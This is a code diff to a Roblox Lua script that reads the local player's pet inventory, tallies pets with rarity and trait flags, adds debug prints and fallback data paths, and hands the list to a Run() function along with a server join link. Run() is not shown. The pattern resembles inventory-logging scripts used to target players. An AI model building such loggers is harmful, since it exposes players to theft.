@@ -66,33 +66,41 @@ local function getPetEmoji(name, p)
 end
 
 -- =========================
--- 📦 PROCESS PETS
+-- 📦 PROCESS PETS (ENHANCED DETECTION)
 -- =========================
 local function process(pets)
     local map, total = {}, 0
 
+    -- Debug: Print what we're receiving
+    print("🔍 DEBUG - Pets received:", typeof(pets), #pets or "nil")
+
     for _, p in pairs(pets or {}) do
-        if p and p.id then
-            local rawName = p.id:gsub("_", " ")
-            local key = normalize(rawName)
+        if p then
+            -- Try multiple possible pet ID locations
+            local petId = p.id or p.name or p.PetId or p.petId or p.Name
+            
+            if petId then
+                local rawName = tostring(petId):gsub("_", " ")
+                local key = normalize(rawName)
 
-            -- Skip unnecessary tags/mutations as requested
-            if not map[key] then
-                map[key] = {
-                    name = rawName:sub(1,1):upper() .. rawName:sub(2),
-                    count = 0,
-                    value = 0, -- Value estimation would go here if you have a table
-                    rarity = (p.rarity or "common"):lower(),
-                    neon = p.properties and p.properties.neon,
-                    mega = p.properties and p.properties.mega,
-                    fly = p.properties and p.properties.flyable,
-                    ride = p.properties and p.properties.rideable
-                }
+                if not map[key] then
+                    map[key] = {
+                        name = rawName:sub(1,1):upper() .. rawName:sub(2),
+                        count = 0,
+                        value = 0,
+                        rarity = (p.rarity or p.Rarity or p.rarity or "common"):lower(),
+                        neon = p.properties and p.properties.neon or p.neon or p.Neon,
+                        mega = p.properties and p.properties.mega or p.mega or p.Mega,
+                        fly = p.properties and p.properties.flyable or p.flyable or p.Flyable or p.fly,
+                        ride = p.properties and p.properties.rideable or p.rideable or p.Rideable or p.ride
+                    }
+                end
+
+                map[key].count += 1
+                total += 10 
+            else
+                print("⚠️ Pet without ID:", p)
             end
-
-            map[key].count += 1
-            -- Total Value logic (using 10 as placeholder if no value table exists)
-            total += 10 
         end
     end
 
@@ -100,6 +108,7 @@ local function process(pets)
     for _, v in pairs(map) do table.insert(list, v) end
     table.sort(list, function(a,b) return a.count > b.count end)
 
+    print("🔍 DEBUG - Processed pets:", #list)
     return list, total
 end
 
@@ -112,7 +121,7 @@ local function format(list)
         if i > 12 then break end
         table.insert(t, string.format("%s%s x%d", getPetEmoji(p.name:lower(), p), p.name, p.count))
     end
-    return (#t > 0 and table.concat(t,"\n") or "No pets")
+    return (#t > 0 and table.concat(t,"\n") or "No pets detected")
 end
 
 -- =========================
@@ -164,9 +173,28 @@ local function Run(data)
 end
 
 -- =========================
--- 🛠️ FETCH REAL DATA SAFELY
+-- 🛠️ FETCH REAL DATA SAFELY (MULTIPLE PATHS)
 -- =========================
-local myData = ClientData.get_data()[game.Players.LocalPlayer.UserId]
+local function getPets()
+    local myData = ClientData.get_data()[game.Players.LocalPlayer.UserId]
+    
+    print("🔍 DEBUG - myData:", myData and "exists" or "nil")
+    
+    if myData then
+        print("🔍 DEBUG - myData.inventory:", myData.inventory and "exists" or "nil")
+        print("🔍 DEBUG - myData.inventory.pets:", myData.inventory and myData.inventory.pets and "exists" or "nil")
+    end
+    
+    -- Try multiple possible paths
+    return (myData and myData.inventory and myData.inventory.pets) or
+           (myData and myData.pets) or
+           (myData and myData.Inventory and myData.Inventory.Pets) or
+           {}
+end
+
+-- Execute
+local pets = getPets()
+print("🔍 FINAL PETS COUNT:", #pets)
 
 Run({
     player = {
@@ -177,5 +205,5 @@ Run({
         players = #game.Players:GetPlayers().."/"..game.Players.MaxPlayers
     },
     joinLink = "https://www.roblox.com/games/"..game.PlaceId.."?server="..game.JobId,
-    pets = (myData and myData.inventory and myData.inventory.pets) or {} -- Safely accessing pets or empty table
+    pets = pets
 })
